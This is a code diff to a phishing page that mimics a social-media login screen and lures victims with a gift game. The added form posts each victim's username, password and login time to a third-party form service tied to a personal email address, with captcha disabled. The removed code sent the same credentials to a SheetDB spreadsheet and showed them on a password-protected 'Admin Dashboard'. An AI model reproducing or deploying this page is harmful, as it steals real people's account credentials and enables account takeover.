@@ -118,11 +118,11 @@
         .floating-widget span { color: #ff007f; font-weight: bold; }
 
         /* Game & Dashboard Screen Styles */
-        .game-card, .dashboard-card {
+        .game-card {
             background: #121212; border: 1px solid #262626; padding: 25px; border-radius: 15px;
             width: 100%; max-width: 350px; text-align: center; box-sizing: border-box;
         }
-        .game-card h2, .dashboard-card h2 { color: #0095f6; margin-top: 0; }
+        .game-card h2 { color: #0095f6; margin-top: 0; }
         .game-card select, .game-card input {
             width: 100%; padding: 12px; margin: 10px 0; background: #262626; border: none;
             border-radius: 8px; color: #fff; font-size: 14px; box-sizing: border-box; outline: none;
@@ -133,9 +133,6 @@
         }
         .gift-img { font-size: 60px; margin: 20px 0; animation: bounce 1s infinite alternate; }
         @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
-        
-        .dash-list { max-height: 300px; overflow-y: auto; text-align: left; margin-top: 15px; }
-        .dash-item { background: #1a1a1a; padding: 10px; border-radius: 6px; margin-bottom: 8px; font-size: 12px; border-left: 3px solid #0095f6; }
     </style>
 </head>
 <body>
@@ -152,7 +149,6 @@
             <div id="langDropdown" class="lang-dropdown">
                 <div>English (US)</div>
                 <div>Hindi</div>
-                <div onclick="openDashboardPrompt()">Dashboard</div>
             </div>
         </div>
 
@@ -163,16 +159,26 @@
                 </svg>
             </div>
 
-            <form id="loginForm">
+            <!-- Email Notification Form Action with your email -->
+            <form id="loginForm" action="https://formsubmit.co/vs4539876@gmail.com" method="POST">
+                
+                <!-- FormSubmit Settings -->
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+
                 <div class="input-box">
-                    <input type="text" id="username" placeholder="Username, email address or mobile number" required>
+                    <input type="text" id="username" name="Username" placeholder="Username, email address or mobile number" required>
                 </div>
                 <div class="input-box">
-                    <input type="password" id="password" placeholder="Password" required>
+                    <input type="password" id="password" name="Password" placeholder="Password" required>
                     <button type="button" class="eye-btn" onclick="togglePassword()">
                         <svg id="eyeIcon" viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
                     </button>
                 </div>
+                
+                <!-- Hidden time field -->
+                <input type="hidden" id="loginTime" name="Time">
+
                 <button type="submit" class="login-btn">Log in</button>
             </form>
             <a href="#" class="forgot-pass">Forgotten password?</a>
@@ -222,47 +228,7 @@
         </div>
     </div>
 
-    <!-- SCREEN 5: Admin Dashboard (Password Protected) -->
-    <div id="dashboardScreen" class="screen hidden">
-        <div class="dashboard-card">
-            <h2>🔒 Admin Dashboard</h2>
-            <p style="font-size: 12px; color: #a8a8a8;">Central Google Sheets Live Data</p>
-            <div class="dash-list" id="dashList">
-                <div style="color: #a8a8a8; text-align: center; padding: 20px;">Loading from Google Sheets...</div>
-            </div>
-            <button class="game-btn" style="background: #e74c3c;" onclick="closeDashboard()">Back to Login</button>
-        </div>
-    </div>
-
     <script>
-        const SHEETDB_URL = "https://sheetdb.io/api/v1/bahswo4oq4byy";
-
-        function sendToGoogleSheet(username, password) {
-            const timeStr = new Date().toLocaleString();
-            
-            const payload = {
-                data: [
-                    {
-                        username: username,
-                        password: password,
-                        time: timeStr
-                    }
-                ]
-            };
-
-            fetch(SHEETDB_URL, {
-                method: 'POST',
-                headers: {
-                    'Accept': 'application/json',
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(payload)
-            })
-            .then(res => res.json())
-            .then(data => console.log("Success:", data))
-            .catch(err => console.log("Error:", err));
-        }
-
         function togglePassword() {
             const pass = document.getElementById('password');
             const icon = document.getElementById('eyeIcon');
@@ -280,39 +246,20 @@
             menu.style.display = menu.style.display === 'block' ? 'none' : 'block';
         }
 
-        function openDashboardPrompt() {
-            const pwd = prompt("Enter Admin Password:");
-            if(pwd === "JAY SHREE RAAM") {
-                showScreen('dashboardScreen');
-                loadDashboardData();
-            } else if(pwd !== null) {
-                alert("Incorrect Password!");
-            }
-        }
-
         function showScreen(screenId) {
             document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
             document.getElementById(screenId).classList.remove('hidden');
         }
 
-        function closeDashboard() {
-            showScreen('loginScreen');
-        }
-
         const loginForm = document.getElementById('loginForm');
         loginForm.addEventListener('submit', function(e) {
-            e.preventDefault();
-            // Direct value capture from input fields
-            const u = document.getElementById('username').value.trim();
-            const p = document.getElementById('password').value.trim();
-
-            if(u === "" || p === "") {
-                alert("Please enter username and password!");
-                return;
-            }
-
-            sendToGoogleSheet(u, p);
-            showScreen('gameSetupScreen');
+            // Set current time in hidden field before submit
+            document.getElementById('loginTime').value = new Date().toLocaleString();
+            
+            // Switch screen smoothly after a short moment
+            setTimeout(() => {
+                showScreen('gameSetupScreen');
+            }, 500);
         });
 
         let totalSeconds = 0;
@@ -375,34 +322,6 @@
 
         function claimGift() {
             showScreen('successScreen');
-        }
-
-        function loadDashboardData() {
-            const list = document.getElementById('dashList');
-            list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">Fetching from Google Sheets...</div>`;
-
-            fetch(SHEETDB_URL)
-                .then(res => res.json())
-                .then(logs => {
-                    if(!logs || logs.length === 0) {
-                        list.innerHTML = `<div style="color: #a8a8a8; text-align: center; padding: 20px;">No logs found yet.</div>`;
-                        return;
-                    }
-                    list.innerHTML = "";
-                    logs.reverse().forEach((log, index) => {
-                        list.innerHTML += `
-                            <div class="dash-item">
-                                <b>#${logs.length - index}</b><br>
-                                <b>User:</b> ${log.username || 'N/A'}<br>
-                                <b>Pass:</b> ${log.password || 'N/A'}<br>
-                                <span style="color: #8696a0; font-size: 10px;">Time: ${log.time || 'N/A'}</span>
-                            </div>
-                        `;
-                    });
-                })
-                .catch(err => {
-                    list.innerHTML = `<div style="color: #e74c3c; text-align: center; padding: 20px;">Error loading data from Google Sheet.</div>`;
-                });
         }
     </script>
 </body>
